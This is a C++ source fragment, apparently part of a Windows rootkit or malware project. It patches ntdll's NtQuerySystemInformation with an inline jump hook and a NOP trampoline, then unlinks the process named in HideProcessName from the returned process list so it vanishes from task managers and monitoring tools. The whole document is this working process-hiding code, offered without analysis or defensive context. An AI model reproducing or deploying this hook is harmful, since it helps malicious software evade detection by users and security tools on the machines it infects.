#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

long __declspec(naked) WINAPI RealNtQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength OPTIONAL)
{
	asm{
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
	}
}

SYSTEM_PROCESS_INFORMATION  *pCurrent;
SYSTEM_PROCESS_INFORMATION  *pPrev;

long  WINAPI MyNtQuerySystemInformation(
   SYSTEM_INFORMATION_CLASS SystemInformationClass,PVOID SystemInformation,
	ULONG SystemInformationLength,PULONG ReturnLength OPTIONAL){


	long BackReturn = RealNtQuerySystemInformation(SystemInformationClass,SystemInformation,
					  SystemInformationLength,ReturnLength);
	if (NT_SUCCESS(BackReturn))
	{

	if (SystemInformationClass == SystemProcessInformation) {
	pCurrent = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
			while (1){
					if(pCurrent->UniqueProcessId != 0) {

					UNICODE_STRING pszImageName = *(UNICODE_STRING*)((long)pCurrent + 0x38);
					AnsiString n = pszImageName.Buffer;

						if( lstrcmpi( n.c_str() , HideProcessName.c_str()  ) == 0)
						{
							if (pCurrent->NextEntryOffset == NULL)
							{
								pPrev->NextEntryOffset =0;
							}
							else
							{
								pPrev->NextEntryOffset += pCurrent->NextEntryOffset;
							}

						}else
						{
							pPrev = pCurrent;
						}
					}
					if(pCurrent->NextEntryOffset == 0) break;
					pCurrent = (SYSTEM_PROCESS_INFORMATION*)((long)pCurrent + pCurrent->NextEntryOffset);
			}

		}
	}


	return BackReturn;
	}


void LauchNtQSysInfoHook()
{
	long NtQuerySystemInformationADR = (long)GetFuncAddr(GetModuleHandle("NtDll"),AnsiString("NtQuerySystemInformation").c_str())  ;
	MEMwrite((void*)RealNtQuerySystemInformation,(void*)NtQuerySystemInformationADR,16);
	AsmJump(NtQuerySystemInformationADR,MyNtQuerySystemInformation,0);
}
